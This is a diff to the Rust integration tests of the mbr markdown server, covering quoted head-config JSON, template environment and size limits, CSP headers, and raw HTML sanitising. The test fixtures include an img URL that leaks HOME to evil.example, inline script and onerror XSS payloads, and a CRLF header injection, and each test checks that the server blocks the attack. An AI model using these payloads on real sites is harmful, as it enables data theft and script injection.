@@ -60,12 +60,15 @@ fn test_server_config(port: u16, root_dir: PathBuf) -> mbr::server::ServerConfig
         edit_require_token_on_loopback: false,
         edit_token_hash: None,
         upload_max_bytes: 25 * 1024 * 1024,
+        template_output_max_bytes: mbr::template_guard::DEFAULT_TEMPLATE_OUTPUT_MAX_BYTES,
         #[cfg(feature = "media-metadata")]
         transcode_enabled: false,
         embedded: None,
         config_problem: None,
         extra_head_html: None,
         theme_vars: std::collections::BTreeMap::new(),
+        content_security_policy: Default::default(),
+        raw_html: Default::default(),
     }
 }
 
@@ -304,7 +307,7 @@ async fn test_head_config_includes_graph_depth() {
     // Default config surfaces graphDepth: 2 in the __MBR_CONFIG__ head script.
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/readme/").await;
-    assert_html_contains(&html, "graphDepth: 2");
+    assert_html_contains(&html, "\"graphDepth\": 2");
 
     // A graph_depth override flows through to the template.
     let server = TestServer::start_with_config_fn(&repo, |c| {
@@ -312,7 +315,7 @@ async fn test_head_config_includes_graph_depth() {
     })
     .await;
     let html = server.get_text("/readme/").await;
-    assert_html_contains(&html, "graphDepth: 4");
+    assert_html_contains(&html, "\"graphDepth\": 4");
 }
 
 /// Both flashcard options reach the deck and the reading chunk only through
@@ -324,8 +327,8 @@ async fn test_head_config_includes_flashcard_options() {
 
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/deck/").await;
-    assert_html_contains(&html, "flashcardsConcentricThreshold: 0.7,");
-    assert_html_contains(&html, "flashcardsProgressIndicators: true,");
+    assert_html_contains(&html, "\"flashcardsConcentricThreshold\": 0.7,");
+    assert_html_contains(&html, "\"flashcardsProgressIndicators\": true,");
 
     let server = TestServer::start_with_config_fn(&repo, |c| {
         c.flashcards_concentric_threshold = 0.85;
@@ -333,8 +336,8 @@ async fn test_head_config_includes_flashcard_options() {
     })
     .await;
     let html = server.get_text("/deck/").await;
-    assert_html_contains(&html, "flashcardsConcentricThreshold: 0.85,");
-    assert_html_contains(&html, "flashcardsProgressIndicators: false,");
+    assert_html_contains(&html, "\"flashcardsConcentricThreshold\": 0.85,");
+    assert_html_contains(&html, "\"flashcardsProgressIndicators\": false,");
 }
 
 /// Deck settings reach `<mbr-slides>` only through `__MBR_CONFIG__`: the
@@ -352,8 +355,8 @@ async fn test_head_config_includes_slide_settings() {
 
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/plain/").await;
-    assert_html_contains(&html, "slides: {},");
-    assert_html_contains(&html, "slidesPage: {},");
+    assert_html_contains(&html, "\"slides\": {},");
+    assert_html_contains(&html, "\"slidesPage\": {},");
 
     let server = TestServer::start_with_config_fn(&repo, |c| {
         c.slides.transition = Some(mbr::slides::Transition::Fade);
@@ -363,13 +366,13 @@ async fn test_head_config_includes_slide_settings() {
     let html = server.get_text("/talks/deck/").await;
     assert_html_contains(
         &html,
-        r#"slides: {"transition":"fade","background_image":"/images/default.jpg"},"#,
+        r#""slides": {"transition":"fade","background_image":"/images/default.jpg"},"#,
     );
     // `/talks/deck/` is one level below `talks/`, so the note-relative
     // `img/bg.png` (= `/talks/img/bg.png`) becomes `../img/bg.png`.
     assert_html_contains(
         &html,
-        r#"slidesPage: {"transition":"zoom","slide_number":true,"background_image":"../img/bg.png"},"#,
+        r#""slidesPage": {"transition":"zoom","slide_number":true,"background_image":"../img/bg.png"},"#,
     );
 }
 
@@ -423,7 +426,7 @@ async fn test_head_config_includes_tasks_default_include() {
     // Default config: checkboxes only, narrower than the wire default of `all`.
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/readme/").await;
-    assert_html_contains(&html, r#"tasksDefaultInclude: "tasks""#);
+    assert_html_contains(&html, r#""tasksDefaultInclude": "tasks""#);
 
     // Each configured value flows through verbatim.
     for include in [
@@ -436,7 +439,7 @@ async fn test_head_config_includes_tasks_default_include() {
         .await;
         let html = server.get_text("/readme/").await;
         let expected = serde_json::to_string(&include).expect("IncludeFilter serializes");
-        assert_html_contains(&html, &format!("tasksDefaultInclude: {expected}"));
+        assert_html_contains(&html, &format!("\"tasksDefaultInclude\": {expected}"));
     }
 }
 
@@ -449,7 +452,7 @@ async fn test_gui_mode_emits_find_bar() {
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/readme/").await;
     assert_html_not_contains(&html, "<mbr-find-bar>");
-    assert_html_contains(&html, "guiMode: false");
+    assert_html_contains(&html, "\"guiMode\": false");
 
     // GUI mode: the bar ships, because the webview has no find of its own.
     let server = TestServer::start_with_config_fn(&repo, |c| {
@@ -460,7 +463,7 @@ async fn test_gui_mode_emits_find_bar() {
     assert_html_contains(&html, "<mbr-find-bar></mbr-find-bar>");
     // The element and window.__MBR_CONFIG__.guiMode come from the same Tera
     // variable; asserting both together keeps them from drifting apart.
-    assert_html_contains(&html, "guiMode: true");
+    assert_html_contains(&html, "\"guiMode\": true");
 }
 
 /// The info panel's absolute file location is a GUI-only value: a served page
@@ -477,7 +480,7 @@ async fn test_file_location_is_gui_only() {
 
     let server = TestServer::start(&repo).await;
     let html = server.get_text("/notes/readme/").await;
-    assert_html_contains(&html, "fileLocation: null");
+    assert_html_contains(&html, "\"fileLocation\": null");
     assert_html_not_contains(&html, root_in_script);
 
     let server = TestServer::start_with_config_fn(&repo, |c| {
@@ -491,7 +494,7 @@ async fn test_file_location_is_gui_only() {
     });
     let line = html
         .lines()
-        .find_map(|line| line.trim().strip_prefix("fileLocation: "))
+        .find_map(|line| line.trim().strip_prefix("\"fileLocation\": "))
         .expect("fileLocation in the head script")
         .trim_end_matches(',');
     let location: serde_json::Value = serde_json::from_str(line).expect("valid JSON");
@@ -3052,12 +3055,12 @@ async fn test_server_mode_sets_server_mode_true() {
 
     // Server mode should have serverMode: true
     assert!(
-        html.contains("serverMode: true"),
+        html.contains("\"serverMode\": true"),
         "Expected serverMode: true in server mode. Got: {}",
         &html[..std::cmp::min(2000, html.len())]
     );
     assert!(
-        !html.contains("serverMode: false"),
+        !html.contains("\"serverMode\": false"),
         "Should not have serverMode: false in server mode"
     );
 }
@@ -5755,21 +5758,21 @@ async fn test_readability_scores_injected_into_extended_meta() {
     // The extendedMeta literal should include both new fields as JS numbers
     // (not the string "null") because the document has words and sentences.
     assert!(
-        html.contains("fleschReadingEase:"),
+        html.contains("\"fleschReadingEase\":"),
         "expected fleschReadingEase field in extendedMeta; html snippet: {}",
         &html[..html.len().min(2000)]
     );
     assert!(
-        html.contains("fleschKincaidGrade:"),
+        html.contains("\"fleschKincaidGrade\":"),
         "expected fleschKincaidGrade field in extendedMeta"
     );
     // Sanity: we should NOT be rendering these as null for a non-trivial doc.
     assert!(
-        !html.contains("fleschReadingEase: null"),
+        !html.contains("\"fleschReadingEase\": null"),
         "FRE should be a number for a document with prose"
     );
     assert!(
-        !html.contains("fleschKincaidGrade: null"),
+        !html.contains("\"fleschKincaidGrade\": null"),
         "FKGL should be a number for a document with prose"
     );
 }
@@ -5788,11 +5791,11 @@ async fn test_readability_scores_null_for_code_only_document() {
     let html = server.get_text("/code-only/").await;
 
     assert!(
-        html.contains("fleschReadingEase: null"),
+        html.contains("\"fleschReadingEase\": null"),
         "FRE should be null for a code-only document"
     );
     assert!(
-        html.contains("fleschKincaidGrade: null"),
+        html.contains("\"fleschKincaidGrade\": null"),
         "FKGL should be null for a code-only document"
     );
 }
@@ -7375,11 +7378,11 @@ async fn page_edit_enabled(server: &TestServer, path: &str, host: &str) -> bool 
         .text()
         .await
         .unwrap();
-    if html.contains("editEnabled: true,") {
+    if html.contains("\"editEnabled\": true,") {
         true
     } else {
         assert!(
-            html.contains("editEnabled: false,"),
+            html.contains("\"editEnabled\": false,"),
             "no editEnabled in page"
         );
         false
@@ -7450,7 +7453,7 @@ async fn test_edit_enabled_is_not_note_frontmatter() {
         .await
         .unwrap();
     assert!(
-        html.contains("editEnabled: true,"),
+        html.contains("\"editEnabled\": true,"),
         "page must still enable editing"
     );
     assert!(
@@ -7459,7 +7462,7 @@ async fn test_edit_enabled_is_not_note_frontmatter() {
     );
     let frontmatter_line = html
         .lines()
-        .find(|line| line.contains("window.frontmatter = "))
+        .find(|line| line.contains("\"frontmatter\": "))
         .expect("page carries window.frontmatter");
     assert!(
         frontmatter_line.contains("\"title\":\"Note\""),
@@ -10634,7 +10637,7 @@ async fn test_head_config_includes_tasks_enabled() {
     // the task panel is reachable from every one of them.
     let server = TestServer::start(&repo).await;
     for path in ["/readme/", "/"] {
-        assert_html_contains(&server.get_text(path).await, "tasksEnabled: true");
+        assert_html_contains(&server.get_text(path).await, "\"tasksEnabled\": true");
     }
 
     let server = TestServer::start_with_config_fn(&repo, |c| {
@@ -10642,7 +10645,7 @@ async fn test_head_config_includes_tasks_enabled() {
     })
     .await;
     for path in ["/readme/", "/"] {
-        assert_html_contains(&server.get_text(path).await, "tasksEnabled: false");
+        assert_html_contains(&server.get_text(path).await, "\"tasksEnabled\": false");
     }
 }
 
@@ -10705,7 +10708,7 @@ async fn test_head_config_includes_review_enabled() {
 
     let server = TestServer::start(&repo).await;
     for path in ["/readme/", "/"] {
-        assert_html_contains(&server.get_text(path).await, "reviewEnabled: true");
+        assert_html_contains(&server.get_text(path).await, "\"reviewEnabled\": true");
     }
 
     let server = TestServer::start_with_config_fn(&repo, |c| {
@@ -10713,7 +10716,7 @@ async fn test_head_config_includes_review_enabled() {
     })
     .await;
     for path in ["/readme/", "/"] {
-        assert_html_contains(&server.get_text(path).await, "reviewEnabled: false");
+        assert_html_contains(&server.get_text(path).await, "\"reviewEnabled\": false");
     }
 }
 
@@ -11889,7 +11892,7 @@ async fn test_periodic_note_has_calendar_nav() {
     );
     assert_html_contains(&html, r#"href="/weekly/2026-W44/""#);
     assert_html_contains(&html, r#"href="/2026-10/""#);
-    assert_html_contains(&html, r#"calendar: {"enabled":true"#);
+    assert_html_contains(&html, r#""calendar": {"enabled":true"#);
 
     // Not periodic: a prefix-dated meeting note and an undated note.
     let meeting = server.get_text("/meetings/2026-10-31%20Acme%20sync/").await;
@@ -11897,7 +11900,7 @@ async fn test_periodic_note_has_calendar_nav() {
     let plain = server.get_text("/plain/").await;
     assert_html_not_contains(&plain, r#"class="mbr-calendar-nav""#);
     // The config is on every page, for the `d` key.
-    assert_html_contains(&plain, r#"calendar: {"enabled":true"#);
+    assert_html_contains(&plain, r#""calendar": {"enabled":true"#);
 
     // `companion = "auto"` (the default) reserves the right column on the
     // day note only; the trigger element is on every page.
@@ -12011,7 +12014,7 @@ async fn test_error_page_carries_the_repositorys_calendar_config() {
     let response = server.get("/no/such/page/").await;
     assert_eq!(response.status(), 404);
     let html = response.text().await.unwrap();
-    assert_html_contains(&html, r#"calendar: {"enabled":false"#);
+    assert_html_contains(&html, r#""calendar": {"enabled":false"#);
     assert_html_not_contains(&html, "<mbr-calendar></mbr-calendar>");
 }
 
@@ -12070,7 +12073,7 @@ async fn test_periodic_detection_default_narrowed_and_off() {
         "a day file name still dates the note"
     );
     assert_html_not_contains(&day_page, r#"class="mbr-calendar-nav""#);
-    assert_html_contains(&day_page, r#"calendar: {"enabled":true"#);
+    assert_html_contains(&day_page, r#""calendar": {"enabled":true"#);
     assert_html_contains(&day_page, "<mbr-calendar></mbr-calendar>");
 }
 
@@ -12344,6 +12347,57 @@ async fn test_broken_page_template_is_an_error_page_naming_the_problem() {
     assert_html_contains(&html, "Page template error");
     assert_html_contains(&html, "t.html");
     assert_html_contains(&html, "no_such_variable");
+}
+
+/// A page template may not read the environment, loop without bound, or
+/// write past `template_output_max_bytes`; each is an error page, and a
+/// fixed template renders again.
+#[tokio::test]
+async fn test_page_template_cost_and_environment_limits_are_error_pages() {
+    let repo = TestRepo::new();
+    repo.create_markdown("env.md", "---\ntemplate: env.html\n---\n\nBody\n");
+    repo.create_static_file(
+        "env.html",
+        br#"<img src="https://evil.example/p?k={{ get_env(name='HOME', default='') }}">"#,
+    );
+    repo.create_markdown("loop.md", "---\ntemplate: loop.html\n---\n\nBody\n");
+    repo.create_static_file(
+        "loop.html",
+        b"{% for i in range(end=100000000) %}x{% endfor %}",
+    );
+    repo.create_markdown("big.md", "---\ntemplate: big.html\n---\n\nBody\n");
+    let chunk = "x".repeat(400);
+    let big = format!("{{% for i in range(end=1000) %}}{chunk}{{% endfor %}}");
+    repo.create_static_file("big.html", big.as_bytes());
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.template_output_max_bytes = 200_000;
+    })
+    .await;
+
+    let response = server.get("/env/").await;
+    assert_eq!(response.status(), 500);
+    let html = response.text().await.unwrap();
+    assert_html_contains(&html, "get_env is disabled");
+    assert_html_not_contains(&html, "evil.example/p?k=/");
+
+    let started = std::time::Instant::now();
+    let response = server.get("/loop/").await;
+    assert_eq!(response.status(), 500);
+    assert!(started.elapsed() < Duration::from_secs(3));
+    assert_html_contains(&response.text().await.unwrap(), "range");
+
+    // Over the cap, twice: the second answer is the remembered failure.
+    for _ in 0..2 {
+        let response = server.get("/big/").await;
+        assert_eq!(response.status(), 500);
+        assert_html_contains(&response.text().await.unwrap(), "larger than 200000 bytes");
+    }
+
+    // A changed template renders again.
+    repo.create_static_file("big.html", b"small {{ title | default(value='page') }}");
+    let response = server.get("/big/").await;
+    assert_eq!(response.status(), 200);
+    assert_eq!(response.text().await.unwrap(), "small page");
 }
 
 #[tokio::test]
@@ -12834,4 +12888,241 @@ fn test_a_theme_var_that_could_break_out_refuses_to_start() {
         error,
         "Host theme refused: theme variable `--pico-primary`: `<` and `>` are not allowed"
     );
+}
+
+// ============================================================================
+// Content-Security-Policy per route class, strict script-src, raw HTML policy
+// ============================================================================
+
+/// A repository with a note carrying author script, a static `.html` file and
+/// a `.mbr/` override.
+fn csp_repo() -> TestRepo {
+    let repo = TestRepo::new();
+    repo.create_markdown(
+        "notes/evil.md",
+        "# Evil\n\n<script>alert('note')</script>\n\n<b>kept</b> <img src=x onerror=alert(1)>\n",
+    );
+    repo.create_static_file(
+        "files/contract.html",
+        b"<html><body><script>alert('file')</script></body></html>",
+    );
+    repo.create_static_file(".mbr/extra.json", b"{}");
+    repo
+}
+
+fn csp_header(response: &reqwest::Response) -> Option<String> {
+    response
+        .headers()
+        .get("content-security-policy")
+        .map(|v| v.to_str().unwrap().to_string())
+}
+
+#[tokio::test]
+async fn test_no_csp_header_by_default() {
+    let repo = csp_repo();
+    let server = TestServer::start(&repo).await;
+    server.wait_for_scan().await;
+    for path in [
+        "/notes/evil/",
+        "/files/contract.html",
+        "/.mbr/theme.css",
+        "/.mbr/extra.json",
+        "/",
+        "/no/such/page/",
+    ] {
+        assert_eq!(csp_header(&server.get(path).await), None, "{path}");
+    }
+    // And the note's script is still written verbatim (passthrough).
+    assert_html_contains(
+        &server.get_text("/notes/evil/").await,
+        "<script>alert('note')</script>",
+    );
+}
+
+#[tokio::test]
+async fn test_csp_header_per_route_class() {
+    let repo = csp_repo();
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.content_security_policy = mbr::csp::ContentSecurityPolicy {
+            pages: Some("default-src 'self'; script-src 'self'".to_string()),
+            user_files: Some(mbr::csp::SANDBOX.to_string()),
+            mbr_assets: Some("default-src 'self'".to_string()),
+        };
+    })
+    .await;
+    server.wait_for_scan().await;
+
+    let pages = Some("default-src 'self'; script-src 'self'".to_string());
+    let sandbox = Some(mbr::csp::SANDBOX.to_string());
+    let assets = Some("default-src 'self'".to_string());
+    for (path, expected) in [
+        ("/notes/evil/", &pages),
+        ("/", &pages),
+        ("/notes/", &pages),
+        ("/no/such/page/", &pages),
+        ("/files/contract.html", &sandbox),
+        // A repository's own `.mbr/` file is served as it is: a user file.
+        ("/.mbr/extra.json", &sandbox),
+        ("/.mbr/theme.css", &assets),
+        ("/.mbr/mbr-bootstrap.js", &assets),
+        ("/.mbr/site.json", &assets),
+    ] {
+        let response = server.get(path).await;
+        assert_eq!(&csp_header(&response), expected, "{path}");
+    }
+}
+
+#[tokio::test]
+async fn test_csp_sandbox_preset_leaves_mbr_assets_alone() {
+    let repo = csp_repo();
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.content_security_policy = mbr::csp::ContentSecurityPolicy::sandbox_user_content();
+    })
+    .await;
+    server.wait_for_scan().await;
+    let sandbox = Some(mbr::csp::SANDBOX.to_string());
+    assert_eq!(csp_header(&server.get("/notes/evil/").await), sandbox);
+    assert_eq!(
+        csp_header(&server.get("/files/contract.html").await),
+        sandbox
+    );
+    assert_eq!(csp_header(&server.get("/.mbr/theme.css").await), None);
+}
+
+#[test]
+fn test_csp_and_raw_html_from_config_toml() {
+    let repo = csp_repo();
+    repo.create_static_file(
+        ".mbr/config.toml",
+        b"raw_html = \"sanitize\"\n\n[content_security_policy]\nuser_files = \"sandbox allow-same-origin\"\n",
+    );
+    let config = mbr::Config::read(repo.path()).expect("config");
+    assert_eq!(
+        config.content_security_policy.user_files.as_deref(),
+        Some(mbr::csp::SANDBOX)
+    );
+    assert_eq!(config.raw_html, mbr::raw_html::RawHtmlPolicy::Sanitize);
+    let server_config = mbr::server::ServerConfig::from(&config);
+    assert_eq!(
+        server_config.content_security_policy,
+        config.content_security_policy
+    );
+    assert_eq!(server_config.raw_html, config.raw_html);
+}
+
+#[test]
+fn test_an_invalid_csp_refuses_to_start() {
+    let repo = TestRepo::new();
+    let mut config = test_server_config(find_available_port(), repo.path().to_path_buf());
+    config.content_security_policy.pages = Some("default-src 'self'\r\nX-Evil: 1".to_string());
+    let error = match mbr::server::Server::init(config) {
+        Ok(_) => panic!("an invalid header value must be refused"),
+        Err(error) => error.to_string(),
+    };
+    assert!(error.contains("pages"), "{error}");
+}
+
+/// Every `data-mbr-globals` block on a page, parsed as JSON.
+fn page_data_blocks(html: &str) -> Vec<serde_json::Value> {
+    const OPEN: &str = r#"<script type="application/json" data-mbr-globals>"#;
+    html.split(OPEN)
+        .skip(1)
+        .map(|rest| {
+            let text = &rest[..rest.find("</script>").expect("closed block")];
+            serde_json::from_str(text).unwrap_or_else(|e| panic!("{e}: {text}"))
+        })
+        .collect()
+}
+
+#[tokio::test]
+async fn test_pages_run_under_a_strict_script_src() {
+    let repo = TestRepo::new();
+    repo.create_markdown(
+        "notes/plain.md",
+        "---\ntitle: \"Plain </script> & <b>\"\ntags: [a]\n---\n\n# Plain\n\nText with a [[Missing]] link and a task:\n\n- [ ] one\n\n```mermaid\ngraph TD; A-->B\n```\n",
+    );
+    repo.create_markdown("notes/other.md", "# Other\n");
+    repo.create_markdown("2026-10-31.md", "# Day\n\n- 09:00 Standup\n");
+    repo.create_static_file("media/clip.mp4", b"not really a video");
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.gui_mode = true;
+        config.edit_enabled = true;
+    })
+    .await;
+    server.wait_for_scan().await;
+
+    for path in [
+        "/notes/plain/",
+        "/",
+        "/notes/",
+        "/2026-10-31/",
+        "/tags/a/",
+        "/tags/",
+        "/no/such/page/",
+        "/.mbr/videos/?path=/media/clip.mp4",
+        "/.mbr/outside/?path=~/x",
+    ] {
+        let html = server.get_text(path).await;
+        let violations =
+            mbr::csp::strict_script_violations(&html, mbr::csp::TEMPLATE_INLINE_SCRIPT_HASHES);
+        assert!(violations.is_empty(), "{path}: {violations:#?}");
+        // The page data is there, as JSON, for the bootstrap to define.
+        let blocks = page_data_blocks(&html);
+        assert!(
+            blocks.iter().any(|b| b.get("__MBR_CONFIG__").is_some()),
+            "{path}: no config block"
+        );
+        assert!(html.contains("mbr-bootstrap.js"), "{path}");
+    }
+
+    let blocks = page_data_blocks(&server.get_text("/notes/plain/").await);
+    let page = blocks
+        .iter()
+        .find(|b| b.get("frontmatter").is_some())
+        .expect("page data block");
+    assert_eq!(page["frontmatter"]["title"], "Plain </script> & <b>");
+    assert!(page["headings"].is_array());
+    assert!(page["extendedMeta"]["wordCount"].as_u64().unwrap() > 0);
+}
+
+#[tokio::test]
+async fn test_bootstrap_script_is_served() {
+    let repo = TestRepo::new();
+    let server = TestServer::start(&repo).await;
+    let response = server.get("/.mbr/mbr-bootstrap.js").await;
+    assert_eq!(response.status(), 200);
+    assert!(
+        response.headers()["content-type"]
+            .to_str()
+            .unwrap()
+            .contains("javascript")
+    );
+    let body = response.text().await.unwrap();
+    assert!(body.contains("data-mbr-globals"), "{body}");
+}
+
+#[tokio::test]
+async fn test_raw_html_policy_applies_to_page_renders() {
+    let repo = csp_repo();
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.raw_html = mbr::raw_html::RawHtmlPolicy::Sanitize;
+    })
+    .await;
+    server.wait_for_scan().await;
+    let html = server.get_text("/notes/evil/").await;
+    assert_html_not_contains(&html, "alert('note')");
+    assert_html_not_contains(&html, "onerror");
+    assert_html_contains(&html, "<b>kept</b>");
+    // Only the author's HTML: mbr's own scripts are still on the page.
+    assert_html_contains(&html, "mbr-components.min.js");
+
+    let repo = csp_repo();
+    let server = TestServer::start_with_config_fn(&repo, |config| {
+        config.raw_html = mbr::raw_html::RawHtmlPolicy::Escape;
+    })
+    .await;
+    server.wait_for_scan().await;
+    let html = server.get_text("/notes/evil/").await;
+    assert_html_contains(&html, "&lt;script&gt;alert('note')&lt;/script&gt;");
+    assert_html_not_contains(&html, "<b>kept</b>");
 }
